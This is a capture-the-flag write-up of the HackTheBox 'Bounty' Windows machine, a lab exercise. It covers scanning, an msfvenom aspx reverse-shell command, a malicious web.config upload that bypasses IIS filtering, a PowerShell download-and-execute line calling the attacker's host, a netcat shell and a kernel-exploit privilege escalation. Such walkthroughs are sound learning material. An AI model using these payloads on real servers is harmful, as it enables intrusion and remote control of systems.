---
title: "HackTheBox - Bounty"
author: Nasrallah
description: ""
date: 2023-05-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, upload, aspx, kernel]
img_path: /assets/img/hackthebox/machines/bounty
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Bounty](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.93
Host is up (0.10s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We only found port 80 open and it's Microsoft IIS http 7.5 web server.

### Web

Let's navigate to the web page.

![](1.png)

Nothing interesting.

#### Feroxbuster

Let's run a directory scan and add the extension `aspx` since this is `IIS`.

```terminal
$ feroxbuster -w /usr/share/wordlists/dirb/common.txt -x aspx -u http://10.10.10.93/ -n                                                              1 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.93/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [aspx]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       32l       53w      630c http://10.10.10.93/
301      GET        2l       10w      156c http://10.10.10.93/aspnet_client => http://10.10.10.93/aspnet_client/
200      GET       22l       58w      941c http://10.10.10.93/transfer.aspx
301      GET        2l       10w      156c http://10.10.10.93/uploadedfiles => http://10.10.10.93/uploadedfiles/
[####################] - 50s     9228/9228    0s      found:4       errors:0      
[####################] - 50s     9228/9228    184/s   http://10.10.10.93/ 
```

We found an upload directory and a page at `transfer.aspx`, let's check it out.

![](2.png)

It's an upload page. The next thing to do it upload an aspx reverse shell.

#### msfvenom

Let's generate the payload using `msfvenom`.

```terminal
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.90 LPORT=9999 -f aspx -o revshell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3427 bytes
Saved as: revshell.aspx                
```

Now let's upload it.

![](3.png)

Invalid file, there must be a filter.

## **Foothold**

After some research I found that we can upload a web.config file that contains the aspx script, check [here](https://web.archive.org/web/20150328012634/https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) for more.

The `web.config` file looks like the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

Now we add to it the following code that will download the `Invoke-PowershellTcp.ps1`

```powershell
<%
Set obj = CreateObject("WScript.shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.17.90/Invoke-PowershellTcp.ps1')")
%>
```

We setup the webserver and a listener then upload the file and request it at `http://10.10.10.92/uploadedfiles/web.config`


```terminal
 $ nc -lvnp 9001 
listening on [any] 9001 ...
connect to [10.10.17.90] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```

We got a shell as `merlin`.

## **Privilege Escalation**

Let's check our privileges.

```terminal
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```

The `SeImpersonatePrivilege` is enabled, but i tried multiple exploit but no luck

Next we run `windows-exploit-suggester`

![](4.png)

It gave us multiple exploits to try, the one I had luck with before is [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

![](5.png)

Great! We got SYSTEM.


## **Resources**

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-.config-files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-.config-files)

[https://web.archive.org/web/20150328012634/https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://web.archive.org/web/20150328012634/https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

[https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).